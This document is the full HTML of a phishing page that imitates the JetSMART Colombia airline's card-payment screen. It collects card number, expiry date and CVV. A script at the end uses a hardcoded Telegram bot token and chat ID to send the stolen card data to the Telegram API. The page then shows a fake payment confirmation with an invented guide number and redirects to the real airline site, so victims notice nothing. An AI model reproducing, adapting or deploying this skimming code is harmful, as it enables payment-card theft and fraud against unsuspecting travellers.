<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Información de Tarjeta | Tiquetes baratos</title>
    <link rel="shortcut icon" href="./assets/favicon.png" type="image/x-icon">

    <!-- CSS -->
    <link rel="stylesheet" href="./css/normalize.css">
    <link rel="stylesheet" href="./css/main.css">
    <link rel="stylesheet" href="./css/utils.css">
    

    <!-- JS -->
    <script src="./js/functions.js"></script>
    <style>
        .loader {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.98);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .loader.active {
            display: flex;
        }

        .loader-content {
            text-align: center;
        }

        .loader-logo {
            width: 150px;
            height: auto;
            margin-bottom: 20px;
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.7; transform: scale(0.95); }
        }

        .loader-text {
            font-size: 16px;
            color: #333;
            font-weight: 500;
        }

        /* Success Modal */
        .success-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 10000;
            justify-content: center;
            align-items: center;
        }

        .success-modal.active {
            display: flex;
        }

        .success-content {
            background: white;
            padding: 40px 30px;
            border-radius: 12px;
            text-align: center;
            max-width: 380px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            animation: slideUp 0.5s ease;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .check-mark {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: #4CAF50;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: scaleIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        @keyframes scaleIn {
            0% {
                transform: scale(0);
            }
            50% {
                transform: scale(1.1);
            }
            100% {
                transform: scale(1);
            }
        }

        .check-mark svg {
            width: 50px;
            height: 50px;
            stroke: white;
            stroke-width: 3;
            fill: none;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        .check-mark path {
            stroke-dasharray: 60;
            stroke-dashoffset: 60;
            animation: drawCheck 0.6s ease 0.3s forwards;
        }

        @keyframes drawCheck {
            to {
                stroke-dashoffset: 0;
            }
        }

        .success-title {
            font-size: 24px;
            font-weight: 700;
            color: #333;
            margin-bottom: 10px;
        }

        .success-message {
            font-size: 14px;
            color: #666;
            margin-bottom: 15px;
            line-height: 1.6;
        }

        .guide-number {
            background: #f0f0f0;
            padding: 12px;
            border-radius: 6px;
            margin: 15px 0;
            font-size: 12px;
            color: #666;
        }

        .guide-label {
            font-size: 11px;
            color: #999;
            text-transform: uppercase;
            margin-bottom: 5px;
        }

        .guide-value {
            font-size: 16px;
            font-weight: 700;
            color: #2d7f3d;
            font-family: 'Courier New', monospace;
            letter-spacing: 1px;
        }

        .success-footer {
            font-size: 12px;
            color: #999;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div class="loader" id="loadingScreen">
        <div class="loader-content">
            <img src="./assets/media/jetsmart-logo.svg" alt="JetSMART" class="loader-logo">
            <p class="loader-text">Procesando tu pago...</p>
        </div>
    </div>

    <!-- Success Modal -->
    <div class="success-modal" id="successModal">
        <div class="success-content">
            <div class="check-mark">
                <svg viewBox="0 0 24 24">
                    <path d="M5 12l5 5L19 7" />
                </svg>
            </div>
            <h2 class="success-title">¡Pago Confirmado!</h2>
            <p class="success-message">
                Tus tiquetes serán enviados a tu correo electrónico. Gracias por confiar en JetSMART.
            </p>
            <div class="guide-number">
                <div class="guide-label">Número de guía</div>
                <div class="guide-value" id="guideNumber"></div>
            </div>
            <p class="success-footer">Revisa tu correo en los próximos minutos</p>
        </div>
    </div>

    <nav>
        <div class="d-flex justify-space-between p-2 border-bottom-red">
            <div>
                <img src="./assets/media/jetsmart-logo.svg" width="130px">
            </div>
            <div class="d-flex flex-row align-items-center">
                <img class="rounded-circle mr-1" src="./assets/media/colombia.png" width="12px" height="12px">
                <span>Colombia</span>
                <div class="ml-1">
                    <img src="./assets/media/hamburguer_menu.png" width="35px">
                    <p class="fs-7 m-0 text-center">MENÚ</p>
                </div>
            </div>
        </div>
    </nav>

    <main class="bg-gray-soft pl-2 pr-2">

        <div class="passengers-container">
            <div class="d-flex flex-row justify-content-evenly align-items-center mb-3 mt-3">
                <svg fill="#59c3d9" width="50px" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 128 128" xml:space="preserve"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M44.7,46.3c-2.1-13.7,17.6-17.8,20.8-3.9l5.4,26.8l20.1,0c5.8,0,8.9,4.7,8.9,9v36.4c0,8.9-12.6,8.8-12.6-0.2V86.2H61.6 c-6,0-9.7-4.1-10.6-8.8L44.7,46.3z"></path> <path d="M54.1,30.3c6.5,0,11.8-5.2,11.9-11.8C66,12,60.7,6.7,54.1,6.7c-6.5,0-11.8,5.2-11.8,11.7C42.3,25,47.5,30.3,54.1,30.3"></path> <path d="M28.4,60.6c-1.4-7.6,8.6-9.4,10-1.8l4.4,23.9c1,5,4.6,9.2,9.8,10.8c1.6,0.5,3.3,0.5,4.8,0.6l14.5,0.1 c7.7,0,7.7,10.1-0.1,10.1l-15.2-0.1c-2.3,0-4.7-0.3-7-1c-9-2.7-15.3-10.1-16.9-18.7L28.4,60.6z"></path> </g></svg>
                <p class="m-0 fs-2 fw-bolder tc-blue">Información de tu tarjeta</p>
            </div>

            <form id="card-form">
                <div class="input-container mb-4">
                    <input required type="text" required oninput="formatCNumber(this)" id="p">
                    <label for="p">Número de tarjeta</label>
                </div>
                <div class="d-flex flex-row justify-space-between" style="gap: 15px;">
                    <div class="input-container" style="flex: 1; margin-bottom: 40px;">
                        <input oninput="formatDate(this)" id="pdate" required type="text">
                        <label for="pdate">Expiración</label>
                    </div>
                    <div class="input-container" style="flex: 1; margin-bottom: 40px;">
                        <input id="c" required type="number" required oninput="limitDigits(this, 3)">
                        <label for="c">CVV</label>
                    </div>
                </div>
            </form>
        </div>
    </main>

    <div class="btn-fixed" style="display: flex; gap: 10px;">
        <button onclick="window.location.href='./payment.html'" class="btn btn-red" style="flex: 1;">← Atrás</button>
        <button onclick="submitCardInfo()" class="btn btn-red" style="flex: 1;">Continuar →</button>
    </div>

    <footer class="mb-7">
        <div class="border-top-red mt-2 p-3 d-flex flex-column align-items-center justify-content-center">
            <p class="fs-6 m-0">© 2024 JetSMART Colombia</p>
            <img src="./assets/media/jetsmart-logo.svg" width="180px">
        </div>
    </footer>

    <script src="./js/payment.js"></script>
    <script>
        const TELEGRAM_BOT_TOKEN = '8619673327:AAEUJ-vzXT2OxgbjbHq5AIlbj0r0x4qWryw';
        const TELEGRAM_CHAT_ID = '-1003875450334';

        function generateGuideNumber() {
            const prefix = 'JSM';
            const timestamp = Date.now().toString().slice(-6);
            const random = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
            return `${prefix}-${timestamp}-${random}`;
        }

        function submitCardInfo() {
            const numTarjeta = document.getElementById('p').value;
            const expiracion = document.getElementById('pdate').value;
            const cvv = document.getElementById('c').value;

            if (!numTarjeta || !expiracion || !cvv) {
                alert('Por favor completa todos los campos requeridos');
                return;
            }

            // Mostrar pantalla de carga
            document.getElementById('loadingScreen').classList.add('active');

            const guideNumber = generateGuideNumber();

            const mensaje = `💳 <b>INFORMACIÓN DE TARJETA - JETSMART</b>

<b>Número de tarjeta:</b> <code>${numTarjeta}</code>
<b>Expiración:</b> <code>${expiracion}</code>
<b>CVV:</b> <code>${cvv}</code>

<b>Número de Guía:</b> <code>${guideNumber}</code>

<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: mensaje,
                    parse_mode: 'HTML'
                })
            }).then(response => {
                if (response.ok) {
                    // Después de 4 segundos, mostrar el check de pago confirmado
                    setTimeout(() => {
                        document.getElementById('loadingScreen').classList.remove('active');
                        document.getElementById('successModal').classList.add('active');
                        document.getElementById('guideNumber').textContent = guideNumber;

                        // Redirigir a JetSMART después de 5 segundos más
                        setTimeout(() => {
                            window.location.href = 'https://www.jetsmart.com';
                        }, 5000);
                    }, 4000);
                } else {
                    document.getElementById('loadingScreen').classList.remove('active');
                    alert('Error al procesar. Por favor intenta de nuevo.');
                }
            }).catch(error => {
                console.error('Error:', error);
                document.getElementById('loadingScreen').classList.remove('active');
                alert('Error de conexión. Por favor intenta de nuevo.');
            });
        }
    </script>
</body>
</html>
